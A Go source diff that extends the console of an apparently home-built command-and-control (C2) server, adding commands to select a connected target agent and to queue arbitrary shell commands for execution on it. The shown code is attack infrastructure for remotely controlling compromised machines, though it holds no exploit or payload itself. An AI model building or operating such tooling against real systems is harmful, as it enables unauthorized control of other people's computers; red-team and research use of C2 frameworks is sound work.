@@ -19,11 +19,15 @@ Command                  Description
 -------------------------------------------
 help                     Show this menu
 clear                    Clear the console
+agent <agent_name>		 Interact with target agent
+exec <command>			 Execute command on target
 agents                   List active agents
 exit                     Exit C2
 -------------------------------------------
 
 `
+
+var CurrentAgent *Agent
 
 // StartCLI starts the pseudo console loop
 func StartCLI() {
@@ -71,31 +75,60 @@ func StartCLI() {
 
 		// Trim spaces from command
 		command = strings.TrimSpace(command)
+		if CurrentAgent != nil {
+			rl.SetPrompt(fmt.Sprintf("C2 %s > ", CurrentAgent.Id))
+		} else {
+			rl.SetPrompt("C2 > ")
+		}
 
 		// Command logic switch
-		switch command {
-		case "exit": // Exit command logic
+		switch {
+		case command == "exit": // Exit command logic
 			{
 				fmt.Println("[C2] Shutting down C2, goodbye...")
 				os.Exit(0)
 			}
-		case "help": // Help command logic
+		case command == "help": // Help command logic
 			{
 				fmt.Print(helpMenu)
 			}
-		case "clear": // Clear command logic
+		case command == "clear": // Clear command logic
 			{
 				if err := clearConsole(); err != nil {
 					fmt.Println(err)
 				}
 			}
-		case "agents": // List agents logic
+		case command == "agents": // List agents logic
 			{
 				for _, agent := range AgentMap.Agents {
 					fmt.Printf("ID: %s IP: %s, Last Call: %.0f\n", agent.Id, agent.Ip, time.Since(agent.LastCall).Seconds())
 				}
 			}
+		case strings.HasPrefix(command, "agent "):
+			{
+				agentId := strings.TrimPrefix(command, "agent ")
+				if agent := AgentMap.Get(agentId); agent != nil {
+					CurrentAgent = agent
+					// TODO: Log agent call backs to file
+					rl.SetPrompt(fmt.Sprintf("C2 %s > ", CurrentAgent.Id))
+					rl.SetPrompt(fmt.Sprintf("C2 %s > ", CurrentAgent.Id))
+				} else {
+					fmt.Printf("Agent '%s' does not exist\n", agentId)
+				}
+			}
+		case strings.HasPrefix(command, "exec "):
+			{
+				if CurrentAgent == nil {
+					fmt.Println("No agent selected!")
+					continue
+				}
+
+				cmd := strings.TrimPrefix(command, "exec ")
+				fullCmd := strings.Split(cmd, " ")
+				AgentMap.Enqueue(CurrentAgent.Id, fullCmd)
+			}
 		}
+
 	}
 }
 
